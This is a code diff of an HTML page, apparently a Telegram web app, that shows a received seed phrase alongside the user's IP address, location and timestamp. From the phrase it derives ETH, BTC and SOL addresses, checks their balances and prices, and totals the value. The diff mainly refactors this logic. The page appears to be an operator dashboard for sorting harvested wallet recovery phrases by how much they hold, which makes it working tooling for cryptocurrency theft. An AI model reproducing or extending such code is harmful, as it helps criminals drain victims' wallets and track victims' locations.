@@ -10,6 +10,7 @@
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/bip39@3.0.4/dist/index.umd.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/bitcoinjs-lib@6.1.0/dist/bitcoinjs-lib.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.73.2/lib/index.iife.min.js"></script>
 </head>
 <body>
     <div class="container">
@@ -32,11 +33,11 @@
         const walletType = (data.wallet || "").toLowerCase();
         const timestamp = data.timestamp || "–";
         const ip = data.ip || "–";
-        const location = data.location || "–";
+        const userLocation = data.location || "–";
 
         document.getElementById("timestamp").textContent = timestamp;
         document.getElementById("userIp").textContent = ip;
-        document.getElementById("userLocation").textContent = location;
+        document.getElementById("userLocation").textContent = userLocation;
         document.getElementById("seed").textContent = seedPhrase;
 
         let addresses = {
@@ -53,37 +54,32 @@
 
         async function deriveAddresses(seedPhrase) {
             try {
-                // ETH
                 const ethWallet = ethers.Wallet.fromMnemonic(seedPhrase);
                 addresses.eth = ethWallet.address;
                 document.getElementById("ethAddress").textContent = addresses.eth;
 
-                // BTC
                 const seed = await bip39.mnemonicToSeed(seedPhrase);
                 const root = bitcoin.bip32.fromSeed(seed);
                 const child = root.derivePath("m/44'/0'/0'/0/0");
-                const { address: btcAddress } = bitcoin.payments.p2pkh({ pubkey: child.publicKey });
-                addresses.btc = btcAddress;
+                addresses.btc = bitcoin.payments.p2pkh({ pubkey: child.publicKey }).address;
                 document.getElementById("btcAddress").textContent = addresses.btc;
 
-                // SOL
-                const solanaSeed = await bip39.mnemonicToSeed(seedPhrase);
-                const solKey = solanaSeed.slice(0, 32);
-                const solAddress = await window.solanaWeb3.Keypair.fromSeed(solKey).publicKey.toBase58();
-                addresses.sol = solAddress;
+                const solKey = seed.slice(0, 32);
+                const solPair = solanaWeb3.Keypair.fromSeed(solKey);
+                addresses.sol = solPair.publicKey.toBase58();
                 document.getElementById("solAddress").textContent = addresses.sol;
-            } catch (e) {
-                console.error("Ошибка генерации адресов:", e);
+            } catch (err) {
+                console.error("❌ Ошибка при генерации адресов:", err);
             }
         }
 
         async function fetchPrices() {
             try {
                 const ids = supported.map(c => c.coin).join(",");
-                const url = `https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=eth`;
-                const res = await fetch(url);
+                const res = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=eth`);
                 return await res.json();
             } catch (e) {
+                console.warn("❌ Не удалось получить цены:", e);
                 return {};
             }
         }
@@ -108,8 +104,8 @@
                                 jsonrpc: "2.0",
                                 id: 1,
                                 method: "getBalance",
-                                params: [address]
-                            })
+                                params: [address],
+                            }),
                         });
                         const solData = await solRes.json();
                         return parseFloat(solData.result?.value || 0) / 1e9;
@@ -117,7 +113,7 @@
                         return 0;
                 }
             } catch (e) {
-                console.warn(`Ошибка баланса ${chain}:`, e.message);
+                console.warn(`⚠️ Ошибка получения баланса ${chain}:`, e.message);
                 return 0;
             }
         }
@@ -146,19 +142,18 @@
             else if (walletType.includes("ton")) url = "https://tonkeeper.com/";
             else if (walletType.includes("coinbase")) url = "https://www.coinbase.com/wallet";
 
-            if (window.Telegram && Telegram.WebApp) Telegram.WebApp.openLink(url);
-            else window.open(url, "_blank");
+            if (window.Telegram?.WebApp) {
+                Telegram.WebApp.openLink(url);
+            } else {
+                window.open(url, "_blank");
+            }
         }
 
         document.getElementById("goWalletBtn").addEventListener("click", goToWallet);
 
-        // Ініціалізація
         deriveAddresses(seedPhrase).then(() => {
             calculateTotalETH();
         });
     </script>
-
-    <!-- Solana lib -->
-    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.73.2/lib/index.iife.min.js"></script>
 </body>
 </html>
